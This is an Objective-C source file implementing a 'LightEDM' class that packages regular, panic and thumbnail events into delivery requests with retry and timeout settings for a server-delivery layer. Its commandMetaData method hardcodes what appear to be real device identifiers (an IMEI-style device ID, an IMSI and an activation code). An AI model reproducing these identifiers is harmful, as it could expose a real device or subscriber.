//
//  LightEDM.m
//  TestApp
//
//  Created by Makara Khloth on 10/20/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//

#import "LightEDM.h"
#import "RegularEventDataProvider.h"
#import "PanicEventDataProvider.h"
#import "ThumbnailEventProvider.h"

// DDM
#import "DefDDM.h"
#import "DataDelivery.h"
#import "DeliveryRequest.h"

// CSM
#import "SendEvent.h"
#import "CommandMetaData.h"

@interface LightEDM (private)

- (DeliveryRequest*) regularEventRequest;
- (DeliveryRequest*) panicEventRequest;
- (DeliveryRequest*) thumbnailRequest;
- (DeliveryRequest*) actualEventRequest;
- (DeliveryRequest*) systemEventRequest;

-(CommandMetaData *) commandMetaData;

@end

@implementation LightEDM

@synthesize mDelegate, mCompletedSelector, mUpdatingSelector;

- (id) initWithDataDelivery: (id <DataDelivery>) aDataDelivery {
	if ((self = [super init])) {
		mDataDelivery = aDataDelivery;
		[mDataDelivery retain];
		if ([mDataDelivery isRequestPendingForCaller:kDDC_EDM]) {
			[mDataDelivery registerCaller:kDDC_EDM withListener:self];
		}
		mRegEventProvider = [[RegularEventDataProvider alloc] init];
		mPanicEventProvider = [[PanicEventDataProvider alloc] init];
		mThumbnailEventProvider = [[ThumbnailEventProvider alloc] init];
	}
	return (self);
}

- (void) sendRegularEvent {
	DeliveryRequest* request = [self regularEventRequest];
	if (![mDataDelivery isRequestIsPending:request]) {
		SendEvent* sendEvent = [mRegEventProvider commandData];
		[request setMCommandCode:[sendEvent getCommand]];
		[request setMCommandData:sendEvent];
		[request setMDeliveryListener:self];
		[mDataDelivery deliver:request];
	}
}

- (void) sendPanicEvent {
	DeliveryRequest* request = [self panicEventRequest];
	if (![mDataDelivery isRequestIsPending:request]) {
		SendEvent* sendEvent = [mPanicEventProvider commandData];
		[request setMCommandCode:[sendEvent getCommand]];
		[request setMCommandData:sendEvent];
		[request setMDeliveryListener:self];
		[mDataDelivery deliver:request];
	}
}

- (void) sendThumbnail {
	DeliveryRequest* request = [self thumbnailRequest];
	if (![mDataDelivery isRequestIsPending:request]) {
		SendEvent* sendEvent = [mThumbnailEventProvider commandData];
		[request setMCommandCode:[sendEvent getCommand]];
		[request setMCommandData:sendEvent];
		[request setMDeliveryListener:self];
		[mDataDelivery deliver:request];
	}
}

- (void) sendActualEvent {
}

- (void) sendSystemEvent {
}

- (DeliveryRequest*) regularEventRequest {
	DeliveryRequest* request = [[DeliveryRequest alloc] init];
    [request setMCallerId:kDDC_EDM];
    [request setMPriority:kDDMRequestPriortyNormal];
    [request setMMaxRetry:80];
    [request setMEDPType:kEDPTypeAllRegular];
    [request setMRetryTimeout:10];
    [request setMConnectionTimeout:60];
	[request autorelease];
	return (request);
}

- (DeliveryRequest*) panicEventRequest {
	DeliveryRequest* request = [[DeliveryRequest alloc] init];
    [request setMCallerId:kDDC_EDM];
    [request setMPriority:kDDMRequestPriortyHigh];
    [request setMMaxRetry:3];
    [request setMEDPType:kEDPTypePanic];
    [request setMRetryTimeout:5];
    [request setMConnectionTimeout:60];
	[request autorelease];
	return (request);
}

- (DeliveryRequest*) thumbnailRequest {
	DeliveryRequest* request = [[DeliveryRequest alloc] init];
    [request setMCallerId:kDDC_EDM];
    [request setMPriority:kDDMRequestPriortyNormal];
    [request setMMaxRetry:0];
    [request setMEDPType:kEDPTypeThumbnail];
    [request setMRetryTimeout:5];
    [request setMConnectionTimeout:60];
	[request autorelease];
	return (request);
}

- (DeliveryRequest*) actualEventRequest {
    return nil;
}

- (DeliveryRequest*) systemEventRequest {
    return nil;
}

-(CommandMetaData *) commandMetaData {
	CommandMetaData *metadata = [[CommandMetaData alloc] init];
	[metadata setCompressionCode:1];
	[metadata setConfID:206];
	[metadata setEncryptionCode:1];
	[metadata setProductID:5001];
	[metadata setProtocolVersion:9];
	[metadata setLanguage:1];
	[metadata setActivationCode:@"01618"];
	[metadata setDeviceID:@"353755040360291"];
	[metadata setIMSI:@"520010492905180"];
	[metadata setMCC:@"520"];
	[metadata setMNC:@"01"];
	[metadata setPhoneNumber:@"1234567890"];
	[metadata setProductVersion:@"-3.3.1"];
	[metadata setHostURL:@""];
	[metadata autorelease];
	return (metadata);
}

- (void) requestFinished: (DeliveryResponse*) aResponse {
	NSLog(@"Send Events Completed");
    if ([mDelegate respondsToSelector:mCompletedSelector]) {
        [mDelegate performSelector:mCompletedSelector withObject:aResponse];
    }
}

- (void) updateRequestProgress: (DeliveryResponse*) aResponse {
	NSLog(@"Send Events Updating Progress...");
    if ([mDelegate respondsToSelector:mUpdatingSelector]) {
        [mDelegate performSelector:mUpdatingSelector withObject:aResponse];
    }
}

- (void) dealloc {
	[mThumbnailEventProvider release];
	[mPanicEventProvider release];
	[mRegEventProvider release];
	[mDataDelivery release];
	[super dealloc];
}

@end
